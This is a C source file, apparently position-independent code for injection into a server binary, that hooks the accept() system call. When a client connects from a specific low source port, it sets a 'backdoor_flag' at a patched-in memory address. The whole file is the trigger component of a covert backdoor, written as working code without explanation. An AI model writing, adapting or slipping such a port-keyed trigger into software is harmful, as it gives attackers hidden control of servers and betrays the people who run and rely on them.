#include "syscall_define.h"
#include <netinet/in.h>
#include <stdint.h>
#include <sys/cdefs.h>
#include <sys/socket.h>
#include <syscall.h>

__always_inline void *get_rw_addr ();

__attribute_noinline__ int accept_hook (int fd, struct sockaddr *restrict addr,
                                        socklen_t *restrict addr_len);
__always_inline int sys_accept (int fd, struct sockaddr *restrict addr,
                                socklen_t *restrict addr_len);

int
accept_hook (int fd, struct sockaddr *restrict addr,
             socklen_t *restrict addr_len)
{
  int ret_fd = sys_accept (fd, addr, addr_len);
  uint32_t *backdoor_flag = get_rw_addr ();
  uint8_t high_port = (((struct sockaddr_in *)addr)->sin_port) & 0xff;
  uint8_t low_port
      = ((((struct sockaddr_in *)addr)->sin_port) & 0xff00) / 0x100;
  if (!high_port && (low_port <= 33))
    *backdoor_flag = 16;
  else
    *backdoor_flag = 0;
  return ret_fd;
}

int
sys_accept (int fd, struct sockaddr *restrict addr,
            socklen_t *restrict addr_len)
{
  return syscall3 (SYS_accept, fd, (uint64_t)addr, (uint64_t)addr_len);
}

__always_inline void *
get_rw_addr ()
{
  void *ret;
  __asm__ volatile ("mov rax, 0x0123456789abcdef" : "=a"(ret));
  return ret;
}

void
_start (int fd, struct sockaddr *restrict addr, socklen_t *restrict addr_len)
{
  accept_hook (fd, addr, addr_len);
}
